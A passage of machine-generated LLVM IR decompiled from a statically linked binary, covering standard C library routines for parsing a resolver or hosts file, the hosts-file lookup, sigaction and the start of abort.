  br i1 %v3_1001164c, label %dec_label_pc_10011654, label %dec_label_pc_10011868.preheader

dec_label_pc_10011654:                            ; preds = %dec_label_pc_10011634
  %v0_10011658 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1001d880.936 to i32), i32* %r3.global-to-local, align 4
  store i32 268506724, i32* @lr, align 4
  %v3_10011660 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1001d880.936 to i32), i32 %v0_10011658)
  store i32 %v3_10011660, i32* %r3.global-to-local, align 4
  store i32 %v3_10011660, i32* @r26, align 4
  %v3_10011664 = icmp eq i32 %v3_10011660, 0
  br i1 %v3_10011664, label %dec_label_pc_10011898, label %dec_label_pc_10011868.preheader

dec_label_pc_10011868.preheader:                  ; preds = %dec_label_pc_10011634, %dec_label_pc_10011654
  %v0_1001187416 = phi i32 [ %v3_10011648, %dec_label_pc_10011634 ], [ %v3_10011660, %dec_label_pc_10011654 ]
  %v2_10011868 = ptrtoint i32* %stack_var_-164 to i32
  %v1_100116742 = bitcast i32* %stack_var_-164 to i8*
  %v3_10011758 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10011868

dec_label_pc_10011670:                            ; preds = %dec_label_pc_10011688
  %v1_10011670 = add i32 %v0_100117309, 1
  store i32 %v1_10011670, i32* %r3.global-to-local, align 4
  %v1_10011674 = inttoptr i32 %v1_10011670 to i8*
  %v2_10011674 = load i8, i8* %v1_10011674, align 1
  %v3_10011674 = zext i8 %v2_10011674 to i32
  store i32 %v3_10011674, i32* %r11.global-to-local, align 4
  %v3_1001167c = icmp eq i8 %v2_10011674, 0
  br i1 %v3_1001167c, label %dec_label_pc_10011868.backedge, label %dec_label_pc_10011688

dec_label_pc_10011688:                            ; preds = %dec_label_pc_10011688.lr.ph, %dec_label_pc_10011670
  %v0_1001168c.in = phi i32 [ %v3_100116744, %dec_label_pc_10011688.lr.ph ], [ %v3_10011674, %dec_label_pc_10011670 ]
  %v0_100116a0 = phi i32 [ %v3_100116744, %dec_label_pc_10011688.lr.ph ], [ %v3_10011674, %dec_label_pc_10011670 ]
  %v0_100117309 = phi i32 [ %v2_10011868, %dec_label_pc_10011688.lr.ph ], [ %v1_10011670, %dec_label_pc_10011670 ]
  %v0_1001168c = mul nuw nsw i32 %v0_1001168c.in, 2
  %v2_1001168c = add i32 %v0_1001168c, %v3_10011688.pre
  %v3_1001168c = inttoptr i32 %v2_1001168c to i16*
  %v4_1001168c = load i16, i16* %v3_1001168c, align 2
  %v1_10011690 = and i16 %v4_1001168c, 32
  %v3_10011690 = icmp eq i16 %v1_10011690, 0
  br i1 %v3_10011690, label %dec_label_pc_10011698, label %dec_label_pc_10011670

dec_label_pc_10011698:                            ; preds = %dec_label_pc_10011688
  %v3_10011698 = icmp eq i32 %v0_100116a0, 10
  br i1 %v3_10011698, label %dec_label_pc_10011868.backedge, label %dec_label_pc_100116a0

dec_label_pc_10011868.backedge:                   ; preds = %dec_label_pc_10011670, %dec_label_pc_1001181c, %dec_label_pc_10011824, %dec_label_pc_1001185c, %dec_label_pc_10011674.preheader, %dec_label_pc_10011698, %dec_label_pc_100116a0, %dec_label_pc_100117c4
  %v0_10011874.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10011868

dec_label_pc_100116a0:                            ; preds = %dec_label_pc_10011698
  %v3_100116a0 = icmp eq i32 %v0_100116a0, 35
  br i1 %v3_100116a0, label %dec_label_pc_10011868.backedge, label %dec_label_pc_100116a8

dec_label_pc_100116a8:                            ; preds = %dec_label_pc_100116a0
  store i32 0, i32* @r27, align 4
  store i32 %v2_10011610, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001173010 = inttoptr i32 %v0_100117309 to i8*
  %v2_1001173011 = load i8, i8* %v1_1001173010, align 1
  %v3_1001173414 = icmp eq i8 %v2_1001173011, 0
  br i1 %v3_1001173414, label %dec_label_pc_10011744, label %dec_label_pc_1001173c

dec_label_pc_100116bc:                            ; preds = %dec_label_pc_1001173c
  %v1_100116bc = mul i32 %v0_100116bc, 4
  %v3_100116c0 = load i32, i32* @global_var_1002e5b0, align 4
  store i32 %v3_100116c0, i32* %r11.global-to-local, align 4
  %v1_100116c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_100116c4 = add i32 %v1_100116c4, %v1_100116bc
  %v2_100116c8 = add i32 %v2_100116c4, 16
  %v3_100116c8 = inttoptr i32 %v2_100116c8 to i32*
  store i32 %v0_100116c8, i32* %v3_100116c8, align 4
  %v0_100116d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116d4

dec_label_pc_100116d0:                            ; preds = %dec_label_pc_100116e8
  %v1_100116d0 = add i32 %v0_100116d0, 1
  store i32 %v1_100116d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116d4

dec_label_pc_100116d4:                            ; preds = %dec_label_pc_100116bc, %dec_label_pc_100116d0
  %v0_100116d0 = phi i32 [ %v0_100116d4.pre, %dec_label_pc_100116bc ], [ %v1_100116d0, %dec_label_pc_100116d0 ]
  %v1_100116d4 = inttoptr i32 %v0_100116d0 to i8*
  %v2_100116d4 = load i8, i8* %v1_100116d4, align 1
  %v3_100116d8 = icmp eq i8 %v2_100116d4, 0
  br i1 %v3_100116d8, label %dec_label_pc_10011704, label %dec_label_pc_100116e8

dec_label_pc_100116e8:                            ; preds = %dec_label_pc_100116d4
  %v3_100116e0 = icmp eq i8 %v2_100116d4, 10
  %v3_100116d4 = zext i8 %v2_100116d4 to i32
  %v1_100116dc = mul nuw nsw i32 %v3_100116d4, 2
  %v1_100116e8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100116e8 = add i32 %v1_100116e8, %v1_100116dc
  %v3_100116e8 = inttoptr i32 %v2_100116e8 to i16*
  %v4_100116e8 = load i16, i16* %v3_100116e8, align 2
  %v1_100116ec = and i16 %v4_100116e8, 32
  %v3_100116ec.not = icmp ne i16 %v1_100116ec, 0
  %brmerge = or i1 %v3_100116e0, %v3_100116ec.not
  br i1 %brmerge, label %dec_label_pc_10011704, label %dec_label_pc_100116d0

dec_label_pc_100116fc:                            ; preds = %dec_label_pc_10011718
  %v0_100116fc = load i32, i32* %r7.global-to-local, align 4
  %v1_100116fc = trunc i32 %v0_100116fc to i8
  store i8 %v1_100116fc, i8* %v1_10011704, align 1
  %v0_10011700 = load i32, i32* %r3.global-to-local, align 4
  %v1_10011700 = add i32 %v0_10011700, 1
  store i32 %v1_10011700, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011704

dec_label_pc_10011704:                            ; preds = %dec_label_pc_100116e8, %dec_label_pc_100116d4, %dec_label_pc_100116fc
  %v0_10011730 = phi i32 [ %v1_10011700, %dec_label_pc_100116fc ], [ %v0_100116d0, %dec_label_pc_100116d4 ], [ %v0_100116d0, %dec_label_pc_100116e8 ]
  %v1_10011704 = inttoptr i32 %v0_10011730 to i8*
  %v2_10011704 = load i8, i8* %v1_10011704, align 1
  %v3_10011704 = zext i8 %v2_10011704 to i32
  %v3_10011708 = icmp eq i8 %v2_10011704, 0
  %v1_1001170c = mul nuw nsw i32 %v3_10011704, 2
  store i32 %v1_1001170c, i32* %r11.global-to-local, align 4
  br i1 %v3_10011708, label %dec_label_pc_1001172c, label %dec_label_pc_10011718

dec_label_pc_10011718:                            ; preds = %dec_label_pc_10011704
  %v3_10011710 = icmp eq i8 %v2_10011704, 10
  %v3_10011718 = load i32, i32* @global_var_1002e5b0, align 4
  %v2_1001171c = add i32 %v3_10011718, %v1_1001170c
  %v3_1001171c = inttoptr i32 %v2_1001171c to i16*
  %v4_1001171c = load i16, i16* %v3_1001171c, align 2
  %v1_10011720 = and i16 %v4_1001171c, 32
  %v3_10011720.not = icmp ne i16 %v1_10011720, 0
  %brmerge27 = or i1 %v3_10011710, %v3_10011720.not
  br i1 %brmerge27, label %dec_label_pc_100116fc, label %dec_label_pc_1001172c

dec_label_pc_1001172c:                            ; preds = %dec_label_pc_10011718, %dec_label_pc_10011704
  %v0_1001172c = load i32, i32* @r27, align 4
  %v1_1001172c = add i32 %v0_1001172c, 1
  store i32 %v1_1001172c, i32* @r27, align 4
  %v2_10011730 = load i8, i8* %v1_10011704, align 1
  %v3_10011734 = icmp eq i8 %v2_10011730, 0
  br i1 %v3_10011734, label %dec_label_pc_10011744, label %dec_label_pc_1001173c

dec_label_pc_1001173c:                            ; preds = %dec_label_pc_100116a8, %dec_label_pc_1001172c
  %v0_100116c8 = phi i32 [ %v0_10011730, %dec_label_pc_1001172c ], [ %v0_100117309, %dec_label_pc_100116a8 ]
  %v0_100116bc = phi i32 [ %v1_1001172c, %dec_label_pc_1001172c ], [ 0, %dec_label_pc_100116a8 ]
  %tmp33 = icmp slt i32 %v0_100116bc, 5
  br i1 %tmp33, label %dec_label_pc_100116bc, label %dec_label_pc_10011744

dec_label_pc_10011744:                            ; preds = %dec_label_pc_1001172c, %dec_label_pc_1001173c, %dec_label_pc_100116a8
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1001d898.937 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10011758 = call i32 @__GI_strcoll(i8* %v3_10011758, i32 ptrtoint ([11 x i8]* @global_var_1001d898.937 to i32))
  store i32 %v4_10011758, i32* %r3.global-to-local, align 4
  %v3_1001175c = icmp eq i32 %v4_10011758, 0
  br i1 %v3_1001175c, label %dec_label_pc_10011788, label %dec_label_pc_100117ac

dec_label_pc_10011768:                            ; preds = %dec_label_pc_100117a0
  %v1_10011768 = add i32 %v2_10011790, 24
  %v2_10011768 = inttoptr i32 %v1_10011768 to i32*
  %v3_10011768 = load i32, i32* %v2_10011768, align 4
  store i32 %v3_10011768, i32* %r3.global-to-local, align 4
  store i32 268506992, i32* @lr, align 4
  %v1_1001176c = call i32 @__GI_strdup(i32 %v3_10011768)
  store i32 %v1_1001176c, i32* %r3.global-to-local, align 4
  %v0_10011774 = load i32, i32* @r29, align 4
  %v1_10011774 = add i32 %v0_10011774, 1
  store i32 %v1_10011774, i32* %r11.global-to-local, align 4
  %v1_10011778 = mul i32 %v0_10011774, 4
  store i32 %v1_10011774, i32* @global_var_1002e654.870, align 4
  %v3_10011784 = add i32 %v1_10011778, ptrtoint (i32* @global_var_10034950.871 to i32)
  %v4_10011784 = inttoptr i32 %v3_10011784 to i32*
  store i32 %v1_1001176c, i32* %v4_10011784, align 4
  br label %dec_label_pc_10011788

dec_label_pc_10011788:                            ; preds = %dec_label_pc_10011744, %dec_label_pc_10011768
  %v0_10011788 = load i32, i32* @r31, align 4
  %v1_10011788 = load i32, i32* @r27, align 4
  %v2_10011788 = icmp slt i32 %v0_10011788, %v1_10011788
  %v1_1001178c = mul i32 %v0_10011788, 4
  %v0_10011790 = load i32, i32* @r1, align 4
  %v2_10011790 = add i32 %v0_10011790, %v1_1001178c
  br i1 %v2_10011788, label %dec_label_pc_100117a0, label %dec_label_pc_100117ac

dec_label_pc_100117a0:                            ; preds = %dec_label_pc_10011788
  %v3_100117a0 = load i32, i32* @global_var_1002e654.870, align 4
  %tmp35 = icmp slt i32 %v3_100117a0, 3
  br i1 %tmp35, label %dec_label_pc_10011768, label %dec_label_pc_100117ac

dec_label_pc_100117ac:                            ; preds = %dec_label_pc_100117a0, %dec_label_pc_10011788, %dec_label_pc_10011744
  %v0_100117b0 = load i32, i32* @r30, align 4
  store i32 %v0_100117b0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001d8a4.938 to i32), i32* @r4, align 4
  %v3_100117b8 = inttoptr i32 %v0_100117b0 to i8*
  %v4_100117b8 = call i32 @__GI_strcoll(i8* %v3_100117b8, i32 ptrtoint ([7 x i8]* @global_var_1001d8a4.938 to i32))
  store i32 %v4_100117b8, i32* %r3.global-to-local, align 4
  %v3_100117bc = icmp eq i32 %v4_100117b8, 0
  br i1 %v3_100117bc, label %dec_label_pc_100117fc.preheader, label %dec_label_pc_100117c4

dec_label_pc_100117c4:                            ; preds = %dec_label_pc_100117ac
  %v0_100117c8 = load i32, i32* @r30, align 4
  store i32 %v0_100117c8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001d8ac.939 to i32), i32* @r4, align 4
  %v3_100117d0 = inttoptr i32 %v0_100117c8 to i8*
  %v4_100117d0 = call i32 @__GI_strcoll(i8* %v3_100117d0, i32 ptrtoint ([7 x i8]* @global_var_1001d8ac.939 to i32))
  store i32 %v4_100117d0, i32* %r3.global-to-local, align 4
  %v3_100117d4 = icmp eq i32 %v4_100117d0, 0
  br i1 %v3_100117d4, label %dec_label_pc_100117fc.preheader, label %dec_label_pc_10011868.backedge

dec_label_pc_100117fc.preheader:                  ; preds = %dec_label_pc_100117ac, %dec_label_pc_100117c4
  store i32 ptrtoint (i32* @global_var_10034940.926 to i32), i32* @r31, align 4
  %v3_1001180841 = load i32, i32* @global_var_1002e658.924, align 4
  %v2_1001180c43 = icmp sgt i32 %v3_1001180841, 0
  %v1_1001181045 = add i32 %v3_1001180841, -1
  %v1_1001181446 = mul i32 %v1_1001181045, 4
  store i32 %v1_1001181446, i32* %r11.global-to-local, align 4
  br i1 %v2_1001180c43, label %dec_label_pc_100117e0, label %dec_label_pc_1001181c

dec_label_pc_100117e0:                            ; preds = %dec_label_pc_100117fc.preheader, %dec_label_pc_100117e0
  %v1_1001181448 = phi i32 [ %v1_10011814, %dec_label_pc_100117e0 ], [ %v1_1001181446, %dec_label_pc_100117fc.preheader ]
  %v1_1001181047 = phi i32 [ %v1_10011810, %dec_label_pc_100117e0 ], [ %v1_1001181045, %dec_label_pc_100117fc.preheader ]
  %v2_100117e0 = add i32 %v1_1001181448, ptrtoint (i32* @global_var_10034940.926 to i32)
  %v3_100117e0 = inttoptr i32 %v2_100117e0 to i32*
  %v4_100117e0 = load i32, i32* %v3_100117e0, align 4
  store i32 %v4_100117e0, i32* @r3, align 4
  store i32 %v1_1001181047, i32* @global_var_1002e658.924, align 4
  store i32 268507116, i32* @lr, align 4
  %v0_100117e8 = call i32 @free()
  store i32 %v0_100117e8, i32* %r3.global-to-local, align 4
  %v3_100117ec = load i32, i32* @global_var_1002e658.924, align 4
  %v1_100117f4 = mul i32 %v3_100117ec, 4
  %v1_100117f8 = load i32, i32* @r31, align 4
  %v3_100117f8 = add i32 %v1_100117f8, %v1_100117f4
  %v4_100117f8 = inttoptr i32 %v3_100117f8 to i32*
  store i32 0, i32* %v4_100117f8, align 4
  store i32 ptrtoint (i32* @global_var_10034940.926 to i32), i32* @r31, align 4
  %v3_10011808 = load i32, i32* @global_var_1002e658.924, align 4
  %v2_1001180c = icmp sgt i32 %v3_10011808, 0
  %v1_10011810 = add i32 %v3_10011808, -1
  %v1_10011814 = mul i32 %v1_10011810, 4
  store i32 %v1_10011814, i32* %r11.global-to-local, align 4
  br i1 %v2_1001180c, label %dec_label_pc_100117e0, label %dec_label_pc_1001181c

dec_label_pc_1001181c:                            ; preds = %dec_label_pc_100117e0, %dec_label_pc_100117fc.preheader
  %v3_1001185c59 = phi i32 [ %v3_1001180841, %dec_label_pc_100117fc.preheader ], [ %v3_10011808, %dec_label_pc_100117e0 ]
  %v1_1001184449 = load i32, i32* @r27, align 4
  %v2_1001184450 = icmp sgt i32 %v1_1001184449, 1
  %v0_1001184c53 = load i32, i32* @r1, align 4
  %v2_1001184c54 = add i32 %v0_1001184c53, 4
  br i1 %v2_1001184450, label %dec_label_pc_1001185c, label %dec_label_pc_10011868.backedge

dec_label_pc_10011824:                            ; preds = %dec_label_pc_1001185c
  %v1_10011824 = add i32 %v2_1001184c55, 24
  %v2_10011824 = inttoptr i32 %v1_10011824 to i32*
  %v3_10011824 = load i32, i32* %v2_10011824, align 4
  store i32 %v3_10011824, i32* %r3.global-to-local, align 4
  store i32 268507180, i32* @lr, align 4
  %v1_10011828 = call i32 @__GI_strdup(i32 %v3_10011824)
  store i32 %v1_10011828, i32* %r3.global-to-local, align 4
  %v0_10011830 = load i32, i32* @r29, align 4
  %v1_10011830 = add i32 %v0_10011830, 1
  store i32 %v1_10011830, i32* %r11.global-to-local, align 4
  %v1_10011834 = mul i32 %v0_10011830, 4
  store i32 %v1_10011830, i32* @global_var_1002e658.924, align 4
  %v3_10011840 = add i32 %v1_10011834, ptrtoint (i32* @global_var_10034940.926 to i32)
  %v4_10011840 = inttoptr i32 %v3_10011840 to i32*
  store i32 %v1_10011828, i32* %v4_10011840, align 4
  %v0_10011844.pre = load i32, i32* @r31, align 4
  %v1_10011844 = load i32, i32* @r27, align 4
  %v2_10011844 = icmp slt i32 %v0_10011844.pre, %v1_10011844
  br i1 %v2_10011844, label %dec_label_pc_10011824.dec_label_pc_1001185c_crit_edge, label %dec_label_pc_10011868.backedge

dec_label_pc_10011824.dec_label_pc_1001185c_crit_edge: ; preds = %dec_label_pc_10011824
  %v0_1001184c = load i32, i32* @r1, align 4
  %v1_10011848 = mul i32 %v0_10011844.pre, 4
  %v2_1001184c = add i32 %v0_1001184c, %v1_10011848
  %v3_1001185c.pre = load i32, i32* @global_var_1002e658.924, align 4
  br label %dec_label_pc_1001185c

dec_label_pc_1001185c:                            ; preds = %dec_label_pc_1001181c, %dec_label_pc_10011824.dec_label_pc_1001185c_crit_edge
  %v3_1001185c = phi i32 [ %v3_1001185c.pre, %dec_label_pc_10011824.dec_label_pc_1001185c_crit_edge ], [ %v3_1001185c59, %dec_label_pc_1001181c ]
  %v2_1001184c55 = phi i32 [ %v2_1001184c, %dec_label_pc_10011824.dec_label_pc_1001185c_crit_edge ], [ %v2_1001184c54, %dec_label_pc_1001181c ]
  %tmp37 = icmp slt i32 %v3_1001185c, 4
  br i1 %tmp37, label %dec_label_pc_10011824, label %dec_label_pc_10011868.backedge

dec_label_pc_10011868:                            ; preds = %dec_label_pc_10011868.backedge, %dec_label_pc_10011868.preheader
  %v0_10011874 = phi i32 [ %v0_10011874.pre, %dec_label_pc_10011868.backedge ], [ %v0_1001187416, %dec_label_pc_10011868.preheader ]
  store i32 %v2_10011868, i32* %r3.global-to-local, align 4
  store i32 268507260, i32* @lr, align 4
  %v3_10011878 = call i32 @fgets(i32 %v2_10011868, i32 128, i32 %v0_10011874)
  store i32 %v3_10011878, i32* %r3.global-to-local, align 4
  %v3_1001187c = icmp eq i32 %v3_10011878, 0
  br i1 %v3_1001187c, label %dec_label_pc_1001188c, label %dec_label_pc_10011674.preheader

dec_label_pc_10011674.preheader:                  ; preds = %dec_label_pc_10011868
  store i32 %v2_10011868, i32* %r3.global-to-local, align 4
  %v2_100116743 = load i8, i8* %v1_100116742, align 4
  %v3_100116744 = zext i8 %v2_100116743 to i32
  store i32 %v3_100116744, i32* %r11.global-to-local, align 4
  %v3_1001167c6 = icmp eq i8 %v2_100116743, 0
  br i1 %v3_1001167c6, label %dec_label_pc_10011868.backedge, label %dec_label_pc_10011688.lr.ph

dec_label_pc_10011688.lr.ph:                      ; preds = %dec_label_pc_10011674.preheader
  %v3_10011688.pre = load i32, i32* @global_var_1002e5b0, align 4
  br label %dec_label_pc_10011688

dec_label_pc_1001188c:                            ; preds = %dec_label_pc_10011868
  %v0_1001188c = load i32, i32* @r26, align 4
  store i32 %v0_1001188c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10011894.940 to i32), i32* @lr, align 4
  %v1_10011890 = inttoptr i32 %v0_1001188c to i16*
  %v2_10011890 = call i32 @__GI_fclose(i16* %v1_10011890)
  store i32 %v2_10011890, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100118a4

dec_label_pc_10011898:                            ; preds = %dec_label_pc_10011654
  %v0_10011898 = call i32 @__GI___h_errno_location()
  store i32 %v0_10011898, i32* %r3.global-to-local, align 4
  %v2_100118a0 = inttoptr i32 %v0_10011898 to i32*
  store i32 3, i32* %v2_100118a0, align 4
  br label %dec_label_pc_100118a4

dec_label_pc_100118a4:                            ; preds = %entry, %dec_label_pc_1001188c, %dec_label_pc_10011898
  store i32 %v2_10011610, i32* @r3, align 4
  %v0_100118ac = call i32 @__pthread_return_void()
  store i32 %v0_100118ac, i32* %r3.global-to-local, align 4
  ret i32 %v0_100118ac

; uselistorder directives
  uselistorder i32 %v3_100116744, { 2, 0, 1 }
  uselistorder i32 %v1_1001181446, { 1, 0 }
  uselistorder i32 %v1_1001181045, { 1, 0 }
  uselistorder i32 %v0_100116bc, { 1, 0 }
  uselistorder i32 %v1_1001170c, { 1, 0 }
  uselistorder i8* %v1_10011704, { 0, 2, 1 }
  uselistorder i8 %v2_100116d4, { 2, 0, 1 }
  uselistorder i32 %v0_100116d0, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10011674, { 1, 0, 2 }
  uselistorder i32 %v1_10011670, { 0, 2, 1 }
  uselistorder i32 %v2_10011868, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10011610, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 1, 21, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 18, 0, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @free, { 21, 18, 17, 16, 15, 14, 13, 12, 5, 4, 11, 10, 9, 8, 7, 20, 19, 22, 3, 2, 23, 6, 1, 0 }
  uselistorder i32* @global_var_1002e658.924, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10034940.926 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10034950.871 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e570.869 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_100118a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001185c, { 1, 0 }
  uselistorder label %dec_label_pc_100117e0, { 1, 0 }
  uselistorder label %dec_label_pc_100117fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10011788, { 1, 0 }
  uselistorder label %dec_label_pc_10011744, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001173c, { 1, 0 }
  uselistorder label %dec_label_pc_10011704, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100116d4, { 1, 0 }
  uselistorder label %dec_label_pc_10011868.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10011868.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_100118c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268507400, i32* @lr, align 4
  %v9_10011904 = inttoptr i32 %arg3 to i32*
  %v10_10011904 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_10011904, i32 %arg4, i32 %arg5, i32 %v4_100118c8, i32 %arg7)
  ret i32 %v10_10011904
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_10011920 = load i32, i32* @lr, align 4
  store i32 %v0_10011920, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1001192c = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1001193c = add i32 %tmp, 4
  store i32 %v1_1001193c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_10011944 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_10011944, i32* @r3, align 4
  br i1 %v3_1001192c, label %dec_label_pc_1001196c, label %dec_label_pc_1001194c

dec_label_pc_1001194c:                            ; preds = %entry
  %v2_1001194c = load i32, i32* %arg2, align 4
  store i32 %v2_1001194c, i32* %r0.global-to-local, align 4
  store i32 268507480, i32* @lr, align 4
  %v0_10011954 = call i32 @memcpy()
  %v0_10011958 = load i32, i32* @r31, align 4
  %v1_10011958 = add i32 %v0_10011958, 132
  %v2_10011958 = inttoptr i32 %v1_10011958 to i32*
  %v3_10011958 = load i32, i32* %v2_10011958, align 4
  store i32 %v3_10011958, i32* %r0.global-to-local, align 4
  %v1_10011964 = add i32 %v0_10011958, 136
  %v2_10011964 = inttoptr i32 %v1_10011964 to i32*
  %v3_10011964 = load i32, i32* %v2_10011964, align 4
  store i32 %v3_10011964, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001196c

dec_label_pc_1001196c:                            ; preds = %entry, %dec_label_pc_1001194c
  store i32 268507532, i32* @lr, align 4
  %v0_10011988 = call i32 @__syscall_rt_sigaction()
  %v0_1001198c = load i32, i32* %r30.global-to-local, align 4
  %v3_1001198c = icmp eq i32 %v0_1001198c, 0
  store i32 %v0_10011988, i32* @r31, align 4
  br i1 %v3_1001198c, label %dec_label_pc_100119c8, label %dec_label_pc_1001199c

dec_label_pc_1001199c:                            ; preds = %dec_label_pc_1001196c
  %v1_10011994 = icmp slt i32 %v0_10011988, 0
  %v1_1001199c = add i32 %v0_1001198c, 4
  store i32 %v1_1001199c, i32* @r3, align 4
  %v2_100119a0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_100119a0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_10011994, label %dec_label_pc_100119c8, label %dec_label_pc_100119ac

dec_label_pc_100119ac:                            ; preds = %dec_label_pc_1001199c
  %v3_100119ac = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_100119ac, i32* %r0.global-to-local, align 4
  %v2_100119b0 = inttoptr i32 %v0_1001198c to i32*
  store i32 %v3_100119ac, i32* %v2_100119b0, align 4
  store i32 268507576, i32* @lr, align 4
  %v0_100119b4 = call i32 @memcpy()
  %v1_100119c0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100119c0 = add i32 %v1_100119c0, 136
  %v3_100119c0 = inttoptr i32 %v2_100119c0 to i32*
  %v0_100119c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100119c4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100119c4 = add i32 %v1_100119c4, 132
  %v3_100119c4 = inttoptr i32 %v2_100119c4 to i32*
  store i32 %v0_100119c4, i32* %v3_100119c4, align 4
  %v0_100119cc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100119c8

dec_label_pc_100119c8:                            ; preds = %dec_label_pc_1001199c, %dec_label_pc_1001196c, %dec_label_pc_100119ac
  %v0_100119cc = phi i32 [ %v0_10011988, %dec_label_pc_1001199c ], [ %v0_10011988, %dec_label_pc_1001196c ], [ %v0_100119cc.pre, %dec_label_pc_100119ac ]
  store i32 %v0_10011920, i32* %r0.global-to-local, align 4
  ret i32 %v0_100119cc

; uselistorder directives
  uselistorder i32 %v0_10011988, { 0, 1, 3, 2 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_100119c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001196c, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_10011a14.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_100119f8 = call i32 @__pthread_return_0()
  %v2_10011a00 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10011a00, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_10011a1833 = add i32 %v2_10011a00, 124
  %v4_10011a1834 = inttoptr i32 %v3_10011a1833 to i32*
  store i32 0, i32* %v4_10011a1834, align 4
  %v0_10011a1c35 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011a1c36 = add i32 %v0_10011a1c35, -1
  store i32 %v1_10011a1c36, i32* %r9.global-to-local, align 4
  %v0_10011a2037 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011a2038 = add i32 %v0_10011a2037, -1
  store i32 %v1_10011a2038, i32* %ctr.global-to-local, align 4
  %v2_10011a2039 = icmp eq i32 %v1_10011a2038, 0
  br i1 %v2_10011a2039, label %dec_label_pc_10011a24, label %dec_label_pc_10011a14.dec_label_pc_10011a14_crit_edge

dec_label_pc_10011a14.dec_label_pc_10011a14_crit_edge: ; preds = %dec_label_pc_10011a14.lr.ph, %dec_label_pc_10011a14.dec_label_pc_10011a14_crit_edge
  %v1_10011a1c40 = phi i32 [ %v1_10011a1c, %dec_label_pc_10011a14.dec_label_pc_10011a14_crit_edge ], [ %v1_10011a1c36, %dec_label_pc_10011a14.lr.ph ]
  %v0_10011a18.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10011a18.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10011a14 = mul i32 %v1_10011a1c40, 4
